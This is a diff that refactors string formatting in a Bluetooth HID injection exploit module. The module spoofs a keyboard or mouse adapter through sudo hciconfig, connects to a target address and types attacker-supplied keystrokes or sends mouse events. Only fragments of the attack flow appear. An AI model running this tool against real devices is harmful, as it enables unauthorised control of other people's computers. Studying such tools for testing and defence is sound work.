@@ -380,7 +380,7 @@ def _configure_adapter(hci: str, name: str = "WXF Keyboard",
             capture_output=True, timeout=5,
         )
         subprocess.run(
-            ["sudo", "hciconfig", hci, "class", "0x{:06x}".format(device_class)],
+            ["sudo", "hciconfig", hci, "class", f"0x{device_class:06x}"],
             check=True, capture_output=True, timeout=5,
         )
         subprocess.run(
@@ -398,7 +398,7 @@ def _configure_adapter(hci: str, name: str = "WXF Keyboard",
             for fallback_cmd in (
                 ["sudo", "hciconfig", hci, "up"],
                 ["sudo", "hciconfig", hci, "piscan"],
-                ["sudo", "hciconfig", hci, "class", "0x{:06x}".format(device_class)],
+                ["sudo", "hciconfig", hci, "class", f"0x{device_class:06x}"],
                 ["sudo", "hciconfig", hci, "name", name],
             ):
                 try:
@@ -510,7 +510,7 @@ class Exploit(Exploit):
             client.move_to_relative(self.mouse_dx, self.mouse_dy,
                                     steps=max(1, max(abs(self.mouse_dx),
                                                      abs(self.mouse_dy)) // 10))
-            print_info("Mouse moved: dx={}, dy={}".format(self.mouse_dx, self.mouse_dy))
+            print_info(f"Mouse moved: dx={self.mouse_dx}, dy={self.mouse_dy}")
 
         if self.mouse_click:
             btn_map = {
@@ -521,7 +521,7 @@ class Exploit(Exploit):
             button = btn_map.get(self.mouse_click.lower())
             if button:
                 client.send_mouse_click(button)
-                print_info("Mouse click: {}".format(self.mouse_click))
+                print_info(f"Mouse click: {self.mouse_click}")
             else:
                 print_error("Invalid mouse_click. Use: left | right | middle")
 
@@ -554,15 +554,15 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("BT HID Injection Configuration:")
-            print_info("  Target:      {}".format(self.target_address))
-            print_info("  Target OS:   {}".format(self.target_os))
-            print_info("  HID mode:    {}".format(self.hid_mode))
-            print_info("  HCI device:  {}".format(self.hci_device))
+            print_info(f"  Target:      {self.target_address}")
+            print_info(f"  Target OS:   {self.target_os}")
+            print_info(f"  HID mode:    {self.hid_mode}")
+            print_info(f"  HCI device:  {self.hci_device}")
             print_info("  Spoof MAC:   {}".format(self.spoof_mac or "(none)"))
             print_info("  Payload:     {}".format(
                 repr(self.payload_text[:50]) if self.payload_text else "(Tab demo)"))
             if self.hid_mode in ("mouse", "combo"):
-                print_info("  Mouse dx/dy: {}/{}".format(self.mouse_dx, self.mouse_dy))
+                print_info(f"  Mouse dx/dy: {self.mouse_dx}/{self.mouse_dy}")
                 print_info("  Mouse click: {}".format(self.mouse_click or "(none)"))
             return
 
@@ -573,7 +573,7 @@ class Exploit(Exploit):
         dev_class = (BT_CLASS_KEYBOARD_MOUSE if self.hid_mode in ("mouse", "combo")
                      else BT_CLASS_KEYBOARD)
 
-        print_status("Configuring adapter {}...".format(self.hci_device))
+        print_status(f"Configuring adapter {self.hci_device}...")
         is_broadcom = self._is_broadcom_adapter()
         if is_broadcom:
             print_info("Broadcom adapter detected: enabling fallback setup path.")
@@ -581,8 +581,7 @@ class Exploit(Exploit):
                            device_class=dev_class,
                            broadcom_fallback=is_broadcom)
 
-        print_status("Connecting to {} ({})...".format(
-            self.target_address, self.target_os))
+        print_status(f"Connecting to {self.target_address} ({self.target_os})...")
 
         client = HIDKeyboardClient(self.target_address)
         if not client.connect(self.connect_timeout):
@@ -597,13 +596,13 @@ class Exploit(Exploit):
             time.sleep(2.0)
             client.hid_ready = True
 
-        print_success("Connected. Injecting HID events ({})...".format(self.hid_mode))
+        print_success(f"Connected. Injecting HID events ({self.hid_mode})...")
 
         try:
             if self.hid_mode in ("keyboard", "combo"):
                 if self.payload_text:
                     client.type_string(self.payload_text, self.key_delay)
-                    print_success("Typed {} characters.".format(len(self.payload_text)))
+                    print_success(f"Typed {len(self.payload_text)} characters.")
                 else:
                     print_info("No payload_text — running Tab injection demo (5s).")
                     self._inject_demo_tabs(client, 5.0)
@@ -615,4 +614,4 @@ class Exploit(Exploit):
         finally:
             client.close()
 
-        print_success("BT HID injection finished against {}.".format(self.target_address))
+        print_success(f"BT HID injection finished against {self.target_address}.")
